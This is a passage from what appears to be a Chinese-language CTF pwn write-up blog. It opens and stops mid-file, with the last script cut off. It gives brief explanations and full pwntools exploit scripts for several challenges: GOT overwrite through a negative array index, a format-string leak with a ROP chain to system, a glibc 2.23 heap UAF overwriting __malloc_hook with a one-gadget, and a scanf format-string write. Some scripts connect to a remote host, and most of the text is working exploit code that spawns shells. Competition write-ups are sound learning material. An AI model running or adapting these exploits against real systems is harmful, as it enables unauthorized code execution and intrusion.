store</h4><p>存在属于数组越界，可以输入负数，got表可打，先修改exit为main，后续计算偏移泄露libc地址，最后攻击printf的为system，返回后门获取shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="number">31123</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl(<span class="string">&quot;input yours id&quot;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">elf1=ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf1.srand(elf1.time(<span class="number">0</span>))</span><br><span class="line">rl(<span class="string">&quot;Input yours id authentication code:&quot;</span>)</span><br><span class="line">payload = <span class="built_in">str</span>(elf1.rand())</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;4 wine&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">4</span>))</span><br><span class="line">rl(<span class="string">b&#x27;which one to choose&#x27;</span>)</span><br><span class="line">pay=p64(<span class="number">0x40133B</span>)</span><br><span class="line">s(pay)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;4 wine&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">7</span>))</span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">rl(<span class="string">b&#x27;succeed&#x27;</span>)</span><br><span class="line">rl(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1147d0</span></span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system,<span class="built_in">bin</span>=get_sb()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;4 wine&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">7</span>))</span><br><span class="line">s(p64(system))</span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;4 wine&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">4</span>))</span><br><span class="line">rl(<span class="string">b&#x27;which one to choose&#x27;</span>)</span><br><span class="line">pay=p64(<span class="number">0x401511</span>)</span><br><span class="line">s(pay)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="Offensive-Security">Offensive_Security</h4><p>格式化字符串漏洞，线程题，并且给出libc地址，后续栈溢出直接打system的rop链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;Username:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;%7$s&#x27;</span>)</span><br><span class="line">rl(<span class="string">&quot;Welcome, \n&quot;</span>)</span><br><span class="line">password=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21b780</span></span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line"></span><br><span class="line">li(<span class="built_in">hex</span>(password))</span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">rl(<span class="string">b&#x27;password: \n&#x27;</span>)</span><br><span class="line">s(p64(password))</span><br><span class="line">li(<span class="built_in">hex</span>(system))</span><br><span class="line">sl(<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">rl(<span class="string">&quot;authentication code:&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">rl(<span class="string">b&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x0000000000400661</span></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(rdi+<span class="number">1</span>)+p64(rdi) + p64(bin_sh) + p64(system)</span><br><span class="line">sl(pay)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="vtable-hijack">vtable_hijack</h4><p>2.23，uaf+堆溢出，攻击malloc_hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p=remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="number">31942</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice:&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">i</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,con</span>):  </span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;length:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>,con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">i</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x39bb78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">ogg=libc_base+<span class="number">0xd5c07</span></span><br><span class="line">hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x30</span>,p64(hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span>+p64(ogg))</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h3 id="线下">线下</h3><p>线下一共是4道题目，两道ctf两道awdp</p><p>ctf两道题还行，但当时太懵了没做出来，一道scanf的格式化字符串漏洞，另一道是构造read测信道爆破shellcode</p><p>awdp只做出来一道，明显抄袭国赛的一道题目，攻击tcachebin的指针区，另一道题目没用看懂</p><h4 id="scanf">scanf</h4><p>给了栈地址，后门是禁用syscall的shellcode，但可以绕过</p><p>scanf的格式化字符串漏洞实现任意地址写</p><p>偏移的话一个一个测，看写到哪里，写多少字节</p><p>可以控制返回地址直接到后门的read</p><p>执行shellcode</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1735130967820-81b78faa-ae2c-4cda-a092-f0a341dd37e9.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1735130991741-aef4ceac-dd25-4363-8e37-74ebc2dccc79.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span 